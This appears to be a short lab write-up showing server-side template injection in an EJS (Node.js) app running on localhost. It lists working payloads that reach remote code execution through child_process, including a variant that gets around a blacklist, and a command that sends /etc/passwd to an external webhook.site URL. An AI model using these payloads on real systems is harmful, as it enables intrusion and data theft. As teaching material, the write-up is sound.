## SSTI 

### Preparation

Go to `http://localhost:3000/settings` and set STTI is `Yes` ^^

Let's go to `/page-account` and check account details

![img.png](img.png)

### Detect

We will check by payload: `${{<%[%'"}}%\` (fuzzing the template)

![img_1.png](img_1.png)

And save changes. This's a web response. So sever execute my payload and throw error because payload `${{<%[%'"}}%\` is synthesized by many different templates.

![img_2.png](img_2.png)

In order to check it exactly, We will check payload `${7*7}`, `<%- 7*7 %>`, `{{7*7}}`,...

`${7*7}`

![img_3.png](img_3.png)

`<%- 7*7 %>`

![img_4.png](img_4.png)

![img_5.png](img_5.png)

So web server execute our expressions

We can detect type of template with `https://cheatsheet.hackmanit.de/template-injection-table/index.html`

![img_6.png](img_6.png)

=> EJS (NodeJS)

Firstly, I use the payload `<%= global.process.mainModule.require('child_process').execSync('curl https://webhook.site/a00c32ab-e5c5-4d2f-baf6-2f6d6ec5e343') %>`

![img_7.png](img_7.png)

Some words in blacklists????

I will use another payload: `<%= global.process.mainModule.require('child_process').spawn('curl https://webhook.site/a00c32ab-e5c5-4d2f-baf6-2f6d6ec5e343', [], { stdio: 'inherit', shell: true }) %>`

![img_8.png](img_8.png)

So you can excute any command like ls, rm, cat,...

replace curl... -> cat /etc/passwd | curl -X POST -d @- https://webhook.site/635fbc27-02fd-4391-b8dd-e38f73a75690

![img_9.png](img_9.png)